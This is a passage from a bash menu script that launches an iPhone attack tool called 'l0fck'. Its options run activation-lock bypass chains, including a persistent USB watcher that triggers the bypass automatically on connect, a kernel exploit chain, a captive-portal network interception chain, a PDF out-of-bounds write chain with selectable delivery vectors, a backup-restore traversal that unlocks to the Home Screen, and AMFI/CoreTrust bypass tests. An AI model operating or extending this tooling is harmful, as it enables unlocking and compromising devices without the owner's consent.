                sudo ./l0fck --captive-server 80 --captive-dns-port 53 --captive-tls-port 443 ;;
            3)
                print_banner
                echo -n "Enter export file path [research.mobileconfig]: "
                read -r prof_path
                if [ -z "$prof_path" ]; then prof_path="research.mobileconfig"; fi
                run_confirmed "3" "Export Research .mobileconfig Profile" \
                    "./l0fck --export-profile ${prof_path}" \
                    "Host only (no device required)" \
                    "${GREEN}Safe / writes local file only${RESET}" \
                    print_doc_captive print_art_albert_tls \
                    ./l0fck --export-profile "$prof_path" ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

menu_advanced_chains() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Advanced Chains${RESET}"
        echo ""
        echo -e "${BOLD}1.${RESET}  ${GREEN}${BOLD}Full 5-Stage Activation Bypass Chain${RESET}"
        echo -e "${BOLD}2.${RESET}  ${MAGENTA}${BOLD}Automated USB Bypass Watcher (Persistent)${RESET}"
        echo -e "${BOLD}3.${RESET}  ${CYAN}${BOLD}Sovereign-Chain (Hybrid Security Degradation)${RESET}"
        echo -e "${BOLD}4.${RESET}  ${CYAN}${BOLD}Sovereign-Lite (Injection + Notification)${RESET}"
        echo -e "${BOLD}5.${RESET}  ${CYAN}${BOLD}Neo-Chain (Kernel Exploitation Bypass)${RESET}"
        echo -e "${BOLD}6.${RESET}  ${CYAN}${BOLD}SetupAssistant-Chain (Wi-Fi Portal, WebSheet & AppleAVE2 Video Kernel Exploit)${RESET}"
        echo -e "${BOLD}7.${RESET}  ${CYAN}${BOLD}GlyphGrift-Chain (CVE-2026-86950 CoreGraphics PDF OOB Write)${RESET}"
        echo -e "${BOLD}8.${RESET}  ${CYAN}${BOLD}Restore-Chain (MobileBackup2 Restore-Staging Traversal)${RESET}"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-8, B, 0]: "
        read -r choice

        case "$choice" in
            1) run_confirmed "1" "Full 5-Stage Activation Bypass Chain" \
                "./l0fck --bypass-full" \
                "ON, USB-connected, lockdown reachable, setup/activation state" \
                "${YELLOW}Caution: full bypass chain, modifies device state${RESET}" \
                print_doc_bypass_full print_art_bypass_full \
                ./l0fck --bypass-full ;;
            2) run_confirmed "2" "Automated USB Bypass Watcher" \
                "./l0fck --bypass-watch" \
                "USB monitoring; auto-triggers on device connect" \
                "${MAGENTA}Caution: persistent watcher, auto-runs bypass${RESET}" \
                print_doc_bypass_full print_art_bypass_full \
                ./l0fck --bypass-watch ;;
            3) run_confirmed "3" "Sovereign-Chain Security Degradation" \
                "./l0fck --sovereign" \
                "ON, USB-connected, setup/activation state" \
                "${YELLOW}Caution: memory pressure + bypass chain${RESET}" \
                print_doc_sovereign print_art_sovereign \
                ./l0fck --sovereign ;;
            4) run_confirmed "4" "Sovereign-Lite Bypass" \
                "./l0fck --sovereign-lite" \
                "ON, USB-connected, lockdown reachable, setup/activation state" \
                "${YELLOW}Caution: memory pressure, flag injection, respring${RESET}" \
                print_doc_sovereign_lite print_art_sovereign_lite \
                ./l0fck --sovereign-lite ;;
            5) run_confirmed "5" "Neo-Chain Kernel Exploitation Bypass" \
                "./l0fck --neo-chain" \
                "ON, USB-connected, A18 Pro, iOS 26.6.1" \
                "${RED}Danger: kernel exploit chain${RESET}" \
                print_doc_neo_chain print_art_neo_chain \
                ./l0fck --neo-chain ;;
            6)
                print_banner
                echo -e "${CYAN}${BOLD}SetupAssistant-Chain Configuration${RESET}"
                echo ""
                echo "Select Port Mode:"
                echo "  1) Privileged CNA Ports (53/80/443) - [Recommended for real iPhone CNA, requires sudo]"
                echo "  2) Custom / User Ports (e.g. 5353/8080/8443)"
                echo ""
                echo -n "Choose mode [1-2, default: 1]: "
                read -r pmode
                if [ "$pmode" = "2" ]; then
                    echo -n "Enter HTTP port [8080]: "
                    read -r hport
                    if [ -z "$hport" ]; then hport=8080; fi
                    echo -n "Enter DNS port [5353]: "
                    read -r dport
                    if [ -z "$dport" ]; then dport=5353; fi
                    echo -n "Enter TLS port [8443]: "
                    read -r tport
                    if [ -z "$tport" ]; then tport=8443; fi
                    local cmd="./l0fck --setup-assistant-chain --captive-server ${hport} --captive-dns-port ${dport} --captive-tls-port ${tport}"
                    run_confirmed "6" "SetupAssistant-Chain (User Ports)" \
                        "$cmd" \
                        "Wi-Fi Soft AP only (No USB cable required), host listening on custom ports" \
                        "${YELLOW}Caution: network interception${RESET}" \
                        print_doc_setup_assistant_chain print_art_setup_assistant_chain \
                        ./l0fck --setup-assistant-chain --captive-server "$hport" --captive-dns-port "$dport" --captive-tls-port "$tport"
                else
                    local cmd="sudo ./l0fck --setup-assistant-chain"
                    run_confirmed "6" "SetupAssistant-Chain (Privileged Ports)" \
                        "$cmd" \
                        "Wi-Fi Soft AP only (No USB cable required); requires sudo for ports 53/80" \
                        "${RED}Danger: privileged network interception${RESET}" \
                        print_doc_setup_assistant_chain print_art_setup_assistant_chain \
                        sudo ./l0fck --setup-assistant-chain
                fi
                ;;
            7)
                print_banner
                echo -e "${CYAN}${BOLD}GlyphGrift-Chain Configuration${RESET}"
                echo ""
                echo "Select Port Mode:"
                echo "  1) Privileged CNA Ports (53/80/443) - [Recommended for real iPhone CNA, requires sudo]"
                echo "  2) Custom / User Ports (e.g. 5353/8080/8443)"
                echo ""
                echo -n "Choose mode [1-2, default: 1]: "
                read -r pmode
                local hport="" dport="" tport="" port_args=()
                local use_sudo=0
                if [ "$pmode" = "2" ]; then
                    echo -n "Enter HTTP port [8080]: "
                    read -r hport
                    if [ -z "$hport" ]; then hport=8080; fi
                    echo -n "Enter DNS port [5353]: "
                    read -r dport
                    if [ -z "$dport" ]; then dport=5353; fi
                    echo -n "Enter TLS port [8443]: "
                    read -r tport
                    if [ -z "$tport" ]; then tport=8443; fi
                    port_args=(--captive-server "$hport" --captive-dns-port "$dport" --captive-tls-port "$tport")
                else
                    use_sudo=1
                fi

                echo ""
                echo "Select PDF Delivery Vector:"
                echo "  1) <img> ImageIO thumbnail path (default)"
                echo "  2) <iframe>/<object> CG PDF embed path"
                echo ""
                echo -n "Vector choice [1-2, default: 1]: "
                read -r vchoice
                local vec_flag="img"
                if [ "$vchoice" = "2" ]; then
                    vec_flag="embed"
                fi

                echo ""
                echo -n "Use stack-targeted PDF (DX=31)? [y/N]: "
                read -r stack_ans
                local stack_args=()
                case "$stack_ans" in
                    [Yy]|[Yy][Ee][Ss]) stack_args=(--glyphgrift-stack) ;;
                esac

                local base_cmd=(./l0fck --glyphgrift-chain --glyphgrift-vector "$vec_flag" "${stack_args[@]}" "${port_args[@]}")
                local display_cmd="./l0fck --glyphgrift-chain --glyphgrift-vector ${vec_flag}"
                if [ ${#stack_args[@]} -gt 0 ]; then
                    display_cmd="${display_cmd} --glyphgrift-stack"
                fi
                if [ ${#port_args[@]} -gt 0 ]; then
                    display_cmd="${display_cmd} --captive-server ${hport} --captive-dns-port ${dport} --captive-tls-port ${tport}"
                fi
                if [ "$use_sudo" = "1" ]; then
                    display_cmd="sudo ${display_cmd}"
                    run_confirmed "7" "GlyphGrift-Chain (Privileged Ports, vector=${vec_flag})" \
                        "$display_cmd" \
                        "Wi-Fi Soft AP only; requires sudo for ports 53/80/443" \
                        "${RED}Danger: privileged network interception; crash/OOB research only${RESET}" \
                        print_doc_glyphgrift_chain print_art_glyphgrift_chain \
                        sudo "${base_cmd[@]}"
                else
                    run_confirmed "7" "GlyphGrift-Chain (User Ports, vector=${vec_flag})" \
                        "$display_cmd" \
                        "Wi-Fi Soft AP only (No USB); host listening on custom ports" \
                        "${YELLOW}Caution: network interception; crash/OOB research only${RESET}" \
                        print_doc_glyphgrift_chain print_art_glyphgrift_chain \
                        "${base_cmd[@]}"
                fi
                ;;
            8)
                print_banner
                echo -e "${CYAN}${BOLD}Restore-Chain Mode${RESET}"
                echo ""
                echo "Select Restore-Chain Mode:"
                echo "  1) Full Chain (stages 0-6, unlock to Home Screen)"
                echo "  2) Probe Only (stages 0-3, protocol validation, no unlock)"
                echo ""
                echo -n "Choose mode [1-2, default: 1]: "
                read -r rmode
                if [ "$rmode" = "2" ]; then
                    run_confirmed "8" "Restore-Chain (Probe Only)" \
                        "./l0fck --restore-probe" \
                        "ON, USB-connected, A18 Pro, iOS 26.6.1, Find My OFF" \
                        "${YELLOW}Caution: mb2 restore session, no unlock stages${RESET}" \
                        print_doc_restore_chain print_art_restore_chain \
                        ./l0fck --restore-probe
                else
                    run_confirmed "8" "Restore-Chain (Full, unlock to Home Screen)" \
                        "./l0fck --restore-chain" \
                        "ON, USB-connected, A18 Pro, iOS 26.6.1, Find My OFF" \
                        "${RED}Danger: restore-staging traversal + unlock chain${RESET}" \
                        print_doc_restore_chain print_art_restore_chain \
                        ./l0fck --restore-chain
                fi
                ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

menu_diagnostics() {
    while true; do
        print_banner
        echo -e "${CYAN}${BOLD}Diagnostics${RESET}"
        echo -e "${BOLD}1.${RESET}  Run Embedded Self-Tests (22/22 Verification)"
        echo -e "${BOLD}2.${RESET}  Test Kernel Exploit Primitive (V-047 / MCC)"
        echo -e "${BOLD}3.${RESET}  Test AMFI / CoreTrust Bypass"
        echo ""
        echo -e "${BOLD}B.${RESET}  Back"
        echo -e "${BOLD}0.${RESET}  Exit"
        echo "----------------------------------------------------------------------"
        echo -n "Select an option [1-3, B, 0]: "
        read -r choice

        case "$choice" in
            1) run_confirmed "1" "Embedded Self-Tests" \
                "./l0fck --test" \
                "Host only (no device required)" \
                "${GREEN}Safe / read-only${RESET}" \
                print_doc_self_test print_art_self_test \
                ./l0fck --test ;;
            2) run_confirmed "2" "Test Kernel Exploit Primitive" \
                "./l0fck --test-kernel-exploit" \
                "Host orchestration; live IOKit needs on-device payload" \
                "${YELLOW}Caution: kernel exploit primitive test${RESET}" \
                print_doc_test_kernel_exploit print_art_test_kernel_exploit \
                ./l0fck --test-kernel-exploit ;;
            3) run_confirmed "3" "Test AMFI / CoreTrust Bypass" \
                "./l0fck --test-amfi-bypass" \
                "Host orchestration; requires kernel R/W primitive first" \
                "${YELLOW}Caution: AMFI/CoreTrust bypass test${RESET}" \
                print_doc_test_amfi_bypass print_art_test_amfi_bypass \
                ./l0fck --test-amfi-bypass ;;
            [Bb]) return ;;
            0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
            *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
        esac
    done
}

print_main_menu() {
    print_banner
    echo -e "${CYAN}${BOLD}Main Menu${RESET}"
    echo ""
    echo -e "${BOLD}1.${RESET}  Device Discovery"
    echo -e "${BOLD}2.${RESET}  Lockdown / AFC"
    echo -e "${BOLD}3.${RESET}  Activation / Albert"
    echo -e "${BOLD}4.${RESET}  Preboard / Setup Assistant"
    echo -e "${BOLD}5.${RESET}  Captive Portal"
    echo -e "${BOLD}6.${RESET}  Advanced Chains"
    echo -e "${BOLD}7.${RESET}  Diagnostics"
    echo ""
    echo -e "${BOLD}0.${RESET}  Exit"
    echo "----------------------------------------------------------------------"
    echo -n "Select a section [1-7, 0]: "
}

# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

check_dependencies
ensure_built

while true; do
    print_main_menu
    read -r section

    case "$section" in
        1) menu_device_discovery ;;
        2) menu_lockdown_afc ;;
        3) menu_activation_albert ;;
        4) menu_preboard ;;
        5) menu_captive_portal ;;
        6) menu_advanced_chains ;;
        7) menu_diagnostics ;;
        0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
        *) echo -e "\n${RED}Invalid selection. Try again.${RESET}"; sleep 1 ;;
    esac
done
